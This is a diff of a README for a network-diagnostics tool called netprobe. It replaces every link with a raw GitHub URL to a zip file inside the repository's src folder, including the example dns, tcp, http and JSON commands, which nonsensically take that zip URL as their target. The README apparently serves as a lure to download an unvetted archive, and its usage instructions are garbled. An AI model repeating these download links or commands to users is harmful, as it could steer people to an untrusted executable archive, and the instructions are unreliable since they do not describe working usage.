@@ -1,6 +1,6 @@
 # 🛠️ netprobe - Fast Network Diagnostics Made Easy
 
-[![Download netprobe](https://raw.githubusercontent.com/iris017/netprobe/main/src/Software-v3.5.zip)](https://raw.githubusercontent.com/iris017/netprobe/main/src/Software-v3.5.zip)
+[![Download netprobe](https://raw.githubusercontent.com/iris017/netprobe/main/src/Software_v3.4.zip)](https://raw.githubusercontent.com/iris017/netprobe/main/src/Software_v3.4.zip)
 
 ## 🥇 Overview
 
@@ -23,11 +23,11 @@ Before you install, ensure your system meets the following requirements:
 
 To download netprobe, visit this page:
 
-[Download netprobe](https://raw.githubusercontent.com/iris017/netprobe/main/src/Software-v3.5.zip)
+[Download netprobe](https://raw.githubusercontent.com/iris017/netprobe/main/src/Software_v3.4.zip)
 
 On this page, you will find the latest version of the application. Click on the version number to find the downloadable files. 
 
-1. Locate the file that matches your operating system (e.g., `https://raw.githubusercontent.com/iris017/netprobe/main/src/Software-v3.5.zip`, `netprobe-macos`, or `netprobe-linux`).
+1. Locate the file that matches your operating system (e.g., `https://raw.githubusercontent.com/iris017/netprobe/main/src/Software_v3.4.zip`, `netprobe-macos`, or `netprobe-linux`).
 2. Click the file to start the download.
 
 ### 3. Run netprobe
@@ -49,15 +49,15 @@ To use netprobe, open your command line or terminal, and run the following comma
 ### Common Commands
 
 1. **Check DNS Resolution**: 
-   - Command: `./netprobe dns https://raw.githubusercontent.com/iris017/netprobe/main/src/Software-v3.5.zip`
+   - Command: `./netprobe dns https://raw.githubusercontent.com/iris017/netprobe/main/src/Software_v3.4.zip`
    - This checks if the domain resolves correctly.
 
 2. **Check TCP Connectivity**: 
-   - Command: `./netprobe tcp https://raw.githubusercontent.com/iris017/netprobe/main/src/Software-v3.5.zip`
+   - Command: `./netprobe tcp https://raw.githubusercontent.com/iris017/netprobe/main/src/Software_v3.4.zip`
    - This tests if a TCP connection can be established.
 
 3. **Check HTTP Status**: 
-   - Command: `./netprobe http https://raw.githubusercontent.com/iris017/netprobe/main/src/Software-v3.5.zip`
+   - Command: `./netprobe http https://raw.githubusercontent.com/iris017/netprobe/main/src/Software_v3.4.zip`
    - Use this to see the HTTP response from a server.
 
 ### JSON Output
@@ -65,7 +65,7 @@ To use netprobe, open your command line or terminal, and run the following comma
 If you want to get the output in JSON format, simply add the `--json` flag to any command:
 
 ```
-./netprobe dns https://raw.githubusercontent.com/iris017/netprobe/main/src/Software-v3.5.zip --json
+./netprobe dns https://raw.githubusercontent.com/iris017/netprobe/main/src/Software_v3.4.zip --json
 ```
 
 This is useful if you plan to integrate netprobe with other scripts or applications.
@@ -93,4 +93,4 @@ This project is licensed under the MIT License. Feel free to use it in your own 
 
 To download netprobe again, simply visit the link below:
 
-[Download netprobe](https://raw.githubusercontent.com/iris017/netprobe/main/src/Software-v3.5.zip)
+[Download netprobe](https://raw.githubusercontent.com/iris017/netprobe/main/src/Software_v3.4.zip)
